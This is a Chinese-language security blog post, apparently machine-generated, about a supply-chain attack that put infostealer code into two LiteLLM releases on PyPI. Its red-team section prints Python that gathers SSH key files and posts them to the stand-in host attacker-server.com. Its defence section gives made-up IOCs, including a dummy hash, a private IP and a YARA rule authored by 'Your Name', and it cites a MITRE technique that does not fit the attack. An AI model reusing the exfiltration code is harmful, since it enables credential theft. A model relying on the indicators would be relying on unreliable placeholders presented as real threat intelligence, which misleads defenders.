---
layout: post
title:  "How LiteLLM Turned Developer Machines Into Credential Vaults for Attackers"
date:   2026-04-06 12:55:04 +0000
categories: [security]
severity: critical
---

# 🚨 解析 LiteLLM 攻擊：開發者端點的安全威脅
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Credential Harvesting
> * **關鍵技術**: Supply Chain Attack, Infostealer Malware

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: LiteLLM 攻擊是通過 PyPI 上的惡意軟件包實現的，攻擊者將 infostealer 惡意軟件注入到 LiteLLM 的版本 1.82.7 和 1.82.8 中。
* **攻擊流程圖解**:
  1. 攻擊者將惡意軟件包上傳到 PyPI。
  2. 開發者安裝或更新 LiteLLM 軟件包。
  3. 惡意軟件包激活，開始收集敏感數據（SSH 密鑰、雲端憑證等）。
* **受影響元件**: LiteLLM 軟件包版本 1.82.7 和 1.82.8。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要將惡意軟件包上傳到 PyPI。
* **Payload 建構邏輯**:

    ```
    
    python
      # 惡意軟件包示例
      import os
      import requests
    
      def collect_credentials():
          # 收集 SSH 密鑰
          ssh_keys = []
          for root, dirs, files in os.walk('/home/user/.ssh'):
              for file in files:
                  if file.endswith('.pub') or file.endswith('.pem'):
                      ssh_keys.append(os.path.join(root, file))
          return ssh_keys
    
      def send_credentials(ssh_keys):
          # 發送收集到的密鑰到攻擊者伺服器
          url = 'https://attacker-server.com/credentials'
          data = {'ssh_keys': ssh_keys}
          requests.post(url, json=data)
    
      if __name__ == '__main__':
          ssh_keys = collect_credentials()
          send_credentials(ssh_keys)
    
    ```
* **繞過技術**: 攻擊者可以使用各種方法繞過安全防護，例如使用加密通訊、隱藏惡意軟件包等。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | attacker-server.com | /home/user/.ssh/id_rsa |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule LiteLLM_Malware {
          meta:
              description = "LiteLLM 惡意軟件包"
              author = "Your Name"
          strings:
              $a = "collect_credentials"
              $b = "send_credentials"
          condition:
              all of them
      }
    
    ```
* **緩解措施**: 更新 LiteLLM 軟件包到最新版本，使用安全的軟件包管理工具，定期掃描系統中的惡意軟件包。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 惡意攻擊者通過攻擊軟件供應鏈中的某個環節，例如開發者或軟件包管理平台，來實現惡意軟件包的分佈。
* **Infostealer Malware (信息竊取惡意軟件)**: 一種惡意軟件，旨在竊取敏感信息，例如密碼、信用卡號等。
* **PyPI (Python 軟件包索引)**: Python 的官方軟件包管理平台，提供了大量的 Python 軟件包。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/how-litellm-turned-developer-machines.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


